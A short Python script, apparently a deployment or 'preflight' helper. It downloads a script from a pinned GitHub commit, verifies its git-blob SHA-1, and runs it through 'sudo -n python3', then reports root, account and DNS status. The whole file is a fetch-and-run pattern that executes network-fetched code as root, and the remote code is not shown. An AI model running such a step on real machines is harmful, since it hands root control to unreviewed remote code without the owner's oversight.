import urllib.request,hashlib,subprocess,json
url="https://raw.githubusercontent.com/martaxi-boss/Vivoapk/540846e48ca3655acb3b0a8601dea700a082979d/infra/deploy.py"
try:
 with urllib.request.urlopen(url,timeout=16) as r: script=r.read(20000)
 b=b"blob "+str(len(script)).encode()+b"\\0"+script
 if hashlib.sha1(b).hexdigest()!="8cfc472dc78598cddd14776bdc6bc3a9439bb9cc":
  print(json.dumps({"status":"blocked","reason":"pinned_git_blob_not_verified"}));raise SystemExit(0)
 p=subprocess.run(["sudo","-n","python3","-","preflight"],input=script,capture_output=True,text=False,timeout=85)
 try: x=json.loads(p.stdout)
 except Exception: x={"status":"blocked","reason":"non_json_preflight_report"}
 out={"status":x.get("status"),"reason":x.get("reason"),"root":x.get("root"),"accounts":x.get("accounts"),"native_tv_dns":x.get("native_tv_dns"),"changes":x.get("changes"),"exit":p.returncode,"git_blob_verified":True}
 print(json.dumps(out,sort_keys=True))
except Exception as e:
 print(json.dumps({"status":"blocked","reason":"read_only_preflight_download_or_execution_failed","error_type":type(e).__name__},sort_keys=True))
